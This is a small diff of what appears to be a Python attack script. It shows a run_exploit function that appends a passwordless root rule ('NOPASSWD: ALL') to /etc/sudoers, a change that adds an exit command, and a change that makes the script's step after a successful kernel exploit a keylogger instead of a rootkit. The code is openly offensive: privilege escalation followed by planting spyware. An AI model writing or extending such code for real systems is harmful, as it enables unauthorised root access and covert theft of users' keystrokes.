@@ -94,7 +94,8 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            
+            run_command(process, 'echo "exit" \n')
+
             # read output
             output = process.stdout.readline()
             while str(output.strip()) != "b'exit'":
@@ -176,7 +177,7 @@ def run():
         # - kernel version
         if exploit_kernel():
             print("kernel exploited")
-            next_action = "rootkit"
+            next_action = "keylogger"
         else:
             print("no kernel exploit available")
             # test something else
